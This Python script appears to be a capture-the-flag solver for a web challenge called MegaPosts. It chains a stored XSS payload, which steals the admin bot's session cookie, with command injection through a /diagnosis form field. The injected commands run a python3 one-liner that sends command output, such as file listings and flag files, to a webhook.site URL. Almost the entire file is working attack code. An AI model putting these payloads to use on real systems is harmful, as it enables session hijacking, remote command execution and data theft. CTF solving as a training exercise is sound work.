#!/usr/bin/env python3
"""MegaPosts solver - XSS to steal admin cookie, then command injection via /diagnosis"""
import requests, time, re, base64, sys

BASE = "https://hackon-mega-posts.chals.io"
WEBHOOK = "https://webhook.site/<YOUR-UUID>"


print("[*] Step 1: Stealing admin cookie via XSS...")

s = requests.Session()
user = f"sol{int(time.time())}"[-8:]
s.post(f"{BASE}/register", data={"username": user, "email": f"{user}@t.com", "password": "p"}, timeout=15)
s.post(f"{BASE}/login", data={"username": user, "password": "p"}, timeout=15)
r = s.get(f"{BASE}/dashboard", timeout=15)
uid = re.search(r"/profile\?uid=(\d+)", r.text).group(1)
print(f"  [+] Registered as {user}, uid={uid}")

# steal cookie and post it to dashboard
js = f"fetch('/post',{{method:'POST',body:new URLSearchParams({{content:'CK:'+document.cookie}})}})"
b64 = base64.b64encode(js.encode()).decode()
xss = f"<img src=x onerror=\"eval(atob('{b64}'))\">"
print(f"  [+] XSS payload length: {len(xss)}")

s.post(f"{BASE}/profile?uid={uid}", data={"bio": xss}, timeout=15)
r = s.get(f"{BASE}/profile?uid={uid}", timeout=15)
if "onerror" not in r.text:
    print("  [-] XSS not saved!")
    sys.exit(1)

print("  [+] XSS saved, triggering bot visit...")
try:
    s.post(f"{BASE}/visit", timeout=60)
except:
    pass

time.sleep(5)

# Read stolen cookie from dashboard
r = s.get(f"{BASE}/dashboard", timeout=15)
cookies = re.findall(r"CK:(session=[^<]+)", r.text)
if not cookies:
    print("  [-] No cookie found, checking all posts...")
    posts = re.findall(r"<p>([^<]+)</p>", r.text)
    for p in posts[:10]:
        print(f"    {p[:120]}")
    sys.exit(1)

admin_cookie = cookies[0].split("=", 1)[1]
print(f"  [+] Admin cookie: {admin_cookie[:40]}...")

print("\n[*] Step 2: Command injection via /diagnosis")

admin = requests.Session()
admin.cookies.set("session", admin_cookie, domain="hackon-mega-posts.chals.io")

# Verify admin access
r = admin.get(f"{BASE}/admin", timeout=15)
if "admin" not in r.text.lower():
    print("  [-] Admin access failed")
    sys.exit(1)
print("  [+] Admin panel accessible")


def inject(cmd, label=""):
    """Inject command via /diagnosis driver parameter, exfiltrate via python3+requests to webhook"""
    payload = f"; python3 -c \"import requests,os; requests.post('{WEBHOOK}', data=os.popen('{cmd}').read())\""
    print(f"  [>] {label or cmd}")
    r = admin.post(f"{BASE}/diagnosis", data={"driver": payload}, timeout=30, allow_redirects=False)
    print(f"      Status: {r.status_code}")
    time.sleep(3)


inject("ls /", "ls /")
time.sleep(5)

inject("cat /flag*", "cat /flag*")
time.sleep(3)
inject("cat /app/flag*", "cat /app/flag*")
time.sleep(3)
inject('find / -name "flag*" -type f 2>/dev/null', "find flags")
time.sleep(3)

print("\n[*] Step 3: Checking webhook for results...")
time.sleep(5)

r = requests.get(f"https://webhook.site/token/<YOUR-UUID>/requests?sorting=newest", timeout=15)
data = r.json()
if "data" in data:
    for req in data["data"]:
        content = req.get("content", "") or req.get("text_content", "") or ""
        if content:
            print(f"  [+] Response: {content[:500]}")
            if "HackOn" in content or "flag" in content.lower() or "Hack0n" in content:
                print(f"\n  [!!!] FLAG FOUND: {content.strip()}")
else:
    print("  [-] No webhook data yet")
    print(f"  Check: https://webhook.site/#!/view/<YOUR-UUID>")
